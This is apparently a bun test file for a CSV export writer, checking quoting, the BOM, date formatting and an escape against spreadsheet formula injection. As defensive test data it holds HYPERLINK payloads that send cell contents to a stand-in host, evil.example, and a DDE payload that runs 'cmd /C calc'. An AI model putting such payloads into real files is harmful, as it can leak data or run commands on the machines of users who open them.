/**
 * The in-repo CSV writer of the dashboard exports (#430): RFC 4180
 * quoting and CRLF records, the UTF-8 BOM, cell formatting, and the
 * OWASP formula-injection escape. Also the pure helpers of the export
 * module (list cells) and the file name.
 */
import { describe, expect, test } from "bun:test";
import { CSV_BOM, csvField, csvRow, escapeFormula } from "../../src/pages/lib/csv.ts";
import { listCell } from "../../src/modules/exports/services/keyset.ts";
import { exportFilename, truncationNote } from "../../src/pages/lib/csv-export.tsx";

describe("csvField: RFC 4180 quoting", () => {
  test("a plain value is written as is", () => {
    expect(csvField("hello")).toBe("hello");
    expect(csvField("a b")).toBe("a b");
  });

  test("a comma, a quote, CR or LF forces quotes; quotes are doubled", () => {
    expect(csvField("a,b")).toBe('"a,b"');
    expect(csvField('say "hi"')).toBe('"say ""hi"""');
    expect(csvField("line1\nline2")).toBe('"line1\nline2"');
    expect(csvField("a\rb")).toBe('"a\rb"');
    expect(csvField('"')).toBe('""""');
  });

  test("null is an empty field; numbers, booleans and dates are formatted", () => {
    expect(csvField(null)).toBe("");
    expect(csvField(42)).toBe("42");
    expect(csvField(true)).toBe("true");
    expect(csvField(false)).toBe("false");
    expect(csvField(new Date("2026-11-08T10:20:30.456Z"))).toBe(
      "2026-11-08T10:20:30.456Z",
    );
  });

  test("unicode is kept as is (the file is UTF-8)", () => {
    expect(csvField("Zoë Ångström 日本 📧")).toBe("Zoë Ångström 日本 📧");
  });
});

describe("csvField: formula injection (OWASP)", () => {
  test.each(["=", "+", "-", "@", "\t", "\r"])(
    "a text cell starting with %p gets a leading '",
    (start) => {
      const value = `${start}HYPERLINK("http://evil.example","x")`;
      expect(escapeFormula(value)).toBe(`'${value}`);
      expect(csvField(value).replace(/^"/, "").startsWith("'")).toBe(true);
    },
  );

  test("the escape is applied before quoting, so the quote rules still hold", () => {
    expect(csvField('=SUM(A1,"x")')).toBe(`"'=SUM(A1,""x"")"`);
    expect(csvField("\rcmd")).toBe(`"'\rcmd"`);
  });

  test("other text, and the characters inside a value, are left alone", () => {
    expect(csvField("a=b")).toBe("a=b");
    expect(csvField("user@example.com")).toBe("user@example.com");
    expect(escapeFormula("'quoted")).toBe("'quoted");
  });

  test("numbers are written by BunMail and never escaped", () => {
    expect(csvField(-5)).toBe("-5");
  });
});

describe("csvField: formula injection past invisible prefixes and in ';' locales", () => {
  test.each([
    [" =1+1", "spaces"],
    ["\u00A0=1+1", "a no-break space"],
    ["\u200B=1+1", "a zero-width space"],
    ["\uFEFF@SUM(A1)", "a BOM"],
    ["\n=1+1", "a line break"],
  ])("a formula after %p (%s) is neutralised", (value) => {
    expect(escapeFormula(value).startsWith("'")).toBe(true);
  });

  test("a DDE payload after a ';' gets a quote before the '=' and the cell is quoted", () => {
    const dde = "x;=cmd|' /C calc'!A0";
    expect(escapeFormula(dde)).toBe("x;'=cmd|' /C calc'!A0");
    expect(csvField(dde)).toBe(`"x;'=cmd|' /C calc'!A0"`);
  });

  test("a HYPERLINK payload after '; ' with spaces is neutralised too", () => {
    const payload = 'Invoice ;  =HYPERLINK("http://evil.example/?d="&A1,"Open")';
    const field = csvField(payload);
    expect(field.startsWith('"')).toBe(true);
    expect(field).toContain(`;  '=HYPERLINK(`);
    expect(field).not.toMatch(/;\s*=/);
  });

  test("every formula character after a ';' or a tab is neutralised", () => {
    expect(escapeFormula("a;+1;-2;@x")).toBe("a;'+1;'-2;'@x");
    expect(escapeFormula("a\t=1")).toBe("a\t'=1");
  });

  test("a ';' without a formula after it is only quoted", () => {
    expect(csvField("a; b")).toBe('"a; b"');
    expect(csvField("campaign=spring; source=x")).toBe('"campaign=spring; source=x"');
  });
});

describe("csvField: dates that are not instants", () => {
  test("an invalid date (Postgres infinity) is an empty field, not a throw", () => {
    expect(csvField(new Date("infinity"))).toBe("");
    expect(csvField(new Date(Number.NaN))).toBe("");
  });
});

describe("csvRow and the BOM", () => {
  test("fields joined by commas, the record ended by CRLF", () => {
    expect(csvRow(["a", null, 3, "x,y"])).toBe('a,,3,"x,y"\r\n');
  });

  test("the BOM is the UTF-8 byte order mark EF BB BF", () => {
    expect([...new TextEncoder().encode(CSV_BOM)]).toEqual([0xef, 0xbb, 0xbf]);
  });
});

describe("export helpers", () => {
  test("listCell joins with '; ', empty for none", () => {
    expect(listCell(["a", "b"])).toBe("a; b");
    expect(listCell([])).toBe("");
    expect(listCell(null)).toBe("");
  });

  test("the file name carries the table and the UTC date", () => {
    expect(exportFilename("emails-trash", new Date("2026-11-08T23:59:59Z"))).toBe(
      "bunmail-emails-trash-2026-11-08.csv",
    );
  });

  test("the truncation note names the cap and starts with no formula character", () => {
    const note = truncationNote(100_000);
    expect(note).toContain("100000");
    expect(escapeFormula(note)).toBe(note);
  });
});
